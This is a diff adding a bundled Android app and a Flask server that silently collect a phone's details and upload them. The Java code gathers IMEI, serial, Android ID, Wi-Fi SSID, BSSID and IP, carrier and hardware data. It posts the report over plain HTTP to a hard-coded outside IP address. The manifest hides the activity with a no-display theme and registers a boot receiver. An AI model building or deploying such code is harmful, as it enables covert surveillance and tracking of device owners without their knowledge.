@@ -1,0 +1,439 @@
+(get all details like version, model etc of android phone and send it to server)
+(activity.xml)
+<?xml version="1.0" encoding="utf-8"?>
+<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:id="@+id/main"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    tools:context=".MainActivity">
+
+</androidx.constraintlayout.widget.ConstraintLayout>
+(mainactivity.java)
+package com.example.myapplication;
+import java.io.DataOutputStream;
+import java.io.FileInputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import android.Manifest;
+import android.Manifest;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.content.pm.PackageManager;
+import android.hardware.Sensor;
+import android.hardware.SensorManager;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
+import android.os.Build;
+import android.os.Environment;
+import android.os.StatFs;
+import android.provider.Settings;
+import android.telephony.TelephonyManager;
+import android.util.DisplayMetrics;
+import android.util.Log;
+import android.widget.Toast;
+import androidx.core.app.ActivityCompat;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.List;
+import java.util.Locale;
+import android.content.Context;
+import android.content.pm.PackageManager;
+import android.location.Location;
+import android.os.Bundle;
+import android.os.Environment;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+import android.widget.TextView;
+import android.widget.Toast;
+
+import androidx.activity.EdgeToEdge;
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.graphics.Insets;
+import androidx.core.view.ViewCompat;
+import androidx.core.view.WindowInsetsCompat;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+//        EdgeToEdge.enable(this);
+//        setContentView(R.layout.activity_main);
+//        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
+//            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
+//            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
+//            return insets;
+//        });
+         collectDeviceInfoAndWriteFile();
+        }
+
+    private void collectDeviceInfoAndWriteFile() {
+        StringBuilder info = new StringBuilder();
+        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+        info.append("Devnfice Iormation Report\n");
+        info.append("Generated: ").append(sdf.format(new Date())).append("\n\n");
+
+        // -------------------- Device & Hardware --------------------
+        info.append("=== DEVICE & HARDWARE ===\n");
+        info.append("Model: ").append(Build.MODEL).append("\n");
+        info.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
+        info.append("Device: ").append(Build.DEVICE).append("\n");
+        info.append("Product: ").append(Build.PRODUCT).append("\n");
+        info.append("Brand: ").append(Build.BRAND).append("\n");
+        info.append("Board: ").append(Build.BOARD).append("\n");
+        info.append("Hardware: ").append(Build.HARDWARE).append("\n");
+        try {
+            info.append("Serial: ").append(Build.getSerial()).append("\n");
+        } catch (SecurityException e) {
+            info.append("Serial: (permission denied)\n");
+        }
+
+        // -------------------- System / OS --------------------
+        info.append("\n=== SYSTEM / OS ===\n");
+        info.append("Android Version: ").append(Build.VERSION.RELEASE).append("\n");
+        info.append("API Level: ").append(Build.VERSION.SDK_INT).append("\n");
+        info.append("Build ID: ").append(Build.ID).append("\n");
+        info.append("Build Time: ").append(sdf.format(new Date(Build.TIME))).append("\n");
+        info.append("Build Tags: ").append(Build.TAGS).append("\n");
+        info.append("User: ").append(Build.USER).append("\n");
+        info.append("Host: ").append(Build.HOST).append("\n");
+
+        // -------------------- Display --------------------
+        info.append("\n=== DISPLAY ===\n");
+        DisplayMetrics metrics = getResources().getDisplayMetrics();
+        info.append("Resolution: ").append(metrics.widthPixels).append("x").append(metrics.heightPixels).append("\n");
+        info.append("Density: ").append(metrics.density).append(" dpi\n");
+        //info.append("Refresh Rate: ").append(metrics.refreshRate).append(" Hz\n");
+
+        // -------------------- Network (Wi-Fi & Mobile) --------------------
+        info.append("\n=== NETWORK ===\n");
+        // Wi-Fi
+        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+        if (wifiManager != null) {
+            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+            if (wifiInfo != null && wifiInfo.getSSID() != null) {
+                info.append("Wi-Fi SSID: ").append(wifiInfo.getSSID()).append("\n");
+                info.append("BSSID: ").append(wifiInfo.getBSSID()).append("\n");
+                info.append("IP Address: ").append(intToIp(wifiInfo.getIpAddress())).append("\n");
+            } else {
+                info.append("Wi-Fi: not connected\n");
+            }
+        } else {
+            info.append("Wi-Fi: not available\n");
+        }
+        // Mobile network
+        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        if (cm != null) {
+            NetworkInfo networkInfo = cm.getActiveNetworkInfo();
+            if (networkInfo != null && networkInfo.isConnected()) {
+                info.append("Active Network Type: ").append(networkInfo.getTypeName()).append("\n");
+                info.append("Subtype: ").append(networkInfo.getSubtypeName()).append("\n");
+            } else {
+                info.append("No active network\n");
+            }
+        }
+
+        // -------------------- Telephony (requires READ_PHONE_STATE) --------------------
+        info.append("\n=== TELEPHONY (if permitted) ===\n");
+        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        if (tm != null) {
+            try {
+                info.append("Phone Type: ").append(getPhoneType(tm.getPhoneType())).append("\n");
+                info.append("Network Operator: ").append(tm.getNetworkOperatorName()).append("\n");
+                info.append("Network Country: ").append(tm.getNetworkCountryIso()).append("\n");
+                info.append("SIM Operator: ").append(tm.getSimOperatorName()).append("\n");
+                info.append("SIM Country: ").append(tm.getSimCountryIso()).append("\n");
+                // IMEI / Device ID
+                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        info.append("IMEI: ").append(tm.getImei()).append("\n");
+                    } else {
+                        info.append("IMEI: ").append(tm.getDeviceId()).append("\n");
+                    }
+                } else {
+                    info.append("IMEI: (permission denied)\n");
+                }
+            } catch (SecurityException e) {
+                info.append("Telephony info: permission denied\n");
+            }
+        } else {
+            info.append("Telephony: not available\n");
+        }
+
+        // -------------------- Battery (sticky broadcast) --------------------
+        info.append("\n=== BATTERY ===\n");
+        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+        if (batteryIntent != null) {
+            int level = batteryIntent.getIntExtra("level", -1);
+            int scale = batteryIntent.getIntExtra("scale", -1);
+            int status = batteryIntent.getIntExtra("status", -1);
+            int plug = batteryIntent.getIntExtra("plugged", -1);
+            float batteryPct = (level * 100.0f / scale);
+            info.append("Level: ").append(level).append(" / ").append(scale).append(" (").append(batteryPct).append("%)\n");
+            info.append("Status: ").append(getBatteryStatus(status)).append("\n");
+            info.append("Plugged: ").append(getPluggedType(plug)).append("\n");
+            // Temperature, voltage
+            int temp = batteryIntent.getIntExtra("temperature", -1);
+            int volt = batteryIntent.getIntExtra("voltage", -1);
+            if (temp != -1) info.append("Temperature: ").append(temp / 10.0f).append("°C\n");
+            if (volt != -1) info.append("Voltage: ").append(volt).append(" mV\n");
+        } else {
+            info.append("Battery info not available\n");
+        }
+
+        // -------------------- Storage (internal & external) --------------------
+        info.append("\n=== STORAGE ===\n");
+        StatFs internal = new StatFs(Environment.getDataDirectory().getPath());
+        info.append("Internal total: ").append(formatSize(internal.getTotalBytes())).append("\n");
+        info.append("Internal free: ").append(formatSize(internal.getFreeBytes())).append("\n");
+        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
+            StatFs external = new StatFs(Environment.getExternalStorageDirectory().getPath());
+            info.append("External total: ").append(formatSize(external.getTotalBytes())).append("\n");
+            info.append("External free: ").append(formatSize(external.getFreeBytes())).append("\n");
+        } else {
+            info.append("External storage: not mounted\n");
+        }
+
+        // -------------------- Memory (RAM) --------------------
+        info.append("\n=== RAM ===\n");
+        android.app.ActivityManager.MemoryInfo memInfo = new android.app.ActivityManager.MemoryInfo();
+        android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+        if (am != null) {
+            am.getMemoryInfo(memInfo);
+            info.append("Total RAM: ").append(formatSize(memInfo.totalMem)).append("\n");
+            info.append("Available RAM: ").append(formatSize(memInfo.availMem)).append("\n");
+            info.append("Low Memory: ").append(memInfo.lowMemory).append("\n");
+        }
+
+        // -------------------- Sensors --------------------
+        info.append("\n=== SENSORS ===\n");
+        SensorManager sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
+        if (sensorManager != null) {
+            List<Sensor> sensors = sensorManager.getSensorList(Sensor.TYPE_ALL);
+            info.append("Total sensors: ").append(sensors.size()).append("\n");
+            for (Sensor s : sensors) {
+                info.append("  - ").append(s.getName()).append(" (type ").append(s.getType()).append(")\n");
+            }
+        }
+
+        // -------------------- Unique IDs --------------------
+        info.append("\n=== UNIQUE IDS ===\n");
+        try {
+            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            info.append("Android ID: ").append(androidId).append("\n");
+        } catch (Exception e) {
+            info.append("Android ID: error\n");
+        }
+        // Advertising ID requires Google Play Services – optional, we'll skip for simplicity
+
+        // -------------------- Write to file --------------------
+        String content = info.toString();
+        File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+        File file = new File(downloadsDir, "device_info.txt");
+
+        try (FileOutputStream fos = new FileOutputStream(file)) {
+            fos.write(content.getBytes());
+            Toast.makeText(this, "Device info saved to: " + file.getAbsolutePath(), Toast.LENGTH_LONG).show();
+            Log.d("DeviceInfo", "File saved: " + file.getAbsolutePath());
+        } catch (IOException e) {
+            e.printStackTrace();
+            Toast.makeText(this, "Write failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+            Log.e("DeviceInfo", "Write failed", e);
+        }
+        uploadFileToVPS(file);
+    }
+
+    // Helper methods
+    private String intToIp(int ip) {
+        return ((ip >> 24) & 0xFF) + "." +
+                ((ip >> 16) & 0xFF) + "." +
+                ((ip >> 8) & 0xFF) + "." +
+                (ip & 0xFF);
+    }
+
+    private String getPhoneType(int type) {
+        switch (type) {
+            case TelephonyManager.PHONE_TYPE_GSM: return "GSM";
+            case TelephonyManager.PHONE_TYPE_CDMA: return "CDMA";
+            case TelephonyManager.PHONE_TYPE_SIP: return "SIP";
+            case TelephonyManager.PHONE_TYPE_NONE: return "None";
+            default: return "Unknown";
+        }
+    }
+
+    private String getBatteryStatus(int status) {
+        switch (status) {
+            case android.os.BatteryManager.BATTERY_STATUS_CHARGING: return "Charging";
+            case android.os.BatteryManager.BATTERY_STATUS_DISCHARGING: return "Discharging";
+            case android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING: return "Not Charging";
+            case android.os.BatteryManager.BATTERY_STATUS_FULL: return "Full";
+            default: return "Unknown";
+        }
+    }
+
+    private String getPluggedType(int plugged) {
+        switch (plugged) {
+            case android.os.BatteryManager.BATTERY_PLUGGED_AC: return "AC";
+            case android.os.BatteryManager.BATTERY_PLUGGED_USB: return "USB";
+            case android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS: return "Wireless";
+            default: return "Unplugged";
+        }
+    }
+
+    private String formatSize(long bytes) {
+        String[] units = {"B", "KB", "MB", "GB", "TB"};
+        int unitIdx = 0;
+        double size = bytes;
+        while (size >= 1024 && unitIdx < units.length - 1) {
+            size /= 1024;
+            unitIdx++;
+        }
+        return String.format(Locale.US, "%.2f %s", size, units[unitIdx]);
+    }
+    private void uploadFileToVPS(File file) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                HttpURLConnection conn = null;
+                DataOutputStream dos = null;
+                String lineEnd = "\r\n";
+                String twoHyphens = "--";
+                String boundary = "*****";
+                try {
+                    URL url = new URL("http://72.60.201.21:5000/upload");
+                    conn = (HttpURLConnection) url.openConnection();
+                    conn.setDoInput(true);
+                    conn.setDoOutput(true);
+                    conn.setUseCaches(false);
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Connection", "Keep-Alive");
+                    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+
+                    dos = new DataOutputStream(conn.getOutputStream());
+                    dos.writeBytes(twoHyphens + boundary + lineEnd);
+                    dos.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + file.getName() + "\"" + lineEnd);
+                    dos.writeBytes(lineEnd);
+
+                    FileInputStream fis = new FileInputStream(file);
+                    byte[] buffer = new byte[8192];
+                    int bytesRead;
+                    while ((bytesRead = fis.read(buffer)) != -1) {
+                        dos.write(buffer, 0, bytesRead);
+                    }
+                    fis.close();
+
+                    dos.writeBytes(lineEnd);
+                    dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+                    dos.flush();
+
+                    int responseCode = conn.getResponseCode();
+                    if (responseCode == 200) {
+                        runOnUiThread(() -> Toast.makeText(MainActivity.this,
+                                "File uploaded successfully", Toast.LENGTH_SHORT).show());
+                        Log.d("Upload", "Success");
+                    } else {
+                        runOnUiThread(() -> Toast.makeText(MainActivity.this,
+                                "Upload failed: " + responseCode, Toast.LENGTH_SHORT).show());
+                        Log.e("Upload", "Server error: " + responseCode);
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    runOnUiThread(() -> Toast.makeText(MainActivity.this,
+                            "Upload error: " + e.getMessage(), Toast.LENGTH_SHORT).show());
+                    Log.e("Upload", "Exception", e);
+                } finally {
+                    if (dos != null) try { dos.close(); } catch (Exception e) {}
+                    if (conn != null) conn.disconnect();
+                }
+            }
+        }).start();
+    }
+}
+(androidmanifest)
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+
+    <application
+        android:allowBackup="true"
+        android:usesCleartextTraffic="true"
+
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.MyApplication">
+        <activity
+            android:name=".MainActivity"
+            android:theme="@android:style/Theme.NoDisplay"
+            android:exported="true"
+            android:windowSoftInputMode="adjustResize">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <service
+            android:name=".MyCustomService"/>
+
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+    </application>
+
+</manifest>
+(server - python)
+from flask import Flask, request, jsonify
+import os
+from datetime import datetime
+
+app = Flask(__name__)
+
+UPLOAD_FOLDER = "uploads"
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    if 'file' not in request.files:
+        return jsonify({"error": "No file part"}), 400
+
+    file = request.files['file']
+    if file.filename == '':
+        return jsonify({"error": "No selected file"}), 400
+
+    # Save with timestamp to avoid overwriting
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = f"device_info_{timestamp}.txt"
+    save_path = os.path.join(UPLOAD_FOLDER, filename)
+    file.save(save_path)
+
+    print(f"File saved: {save_path}")
+    return jsonify({"status": "ok", "saved": filename}), 200
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
+
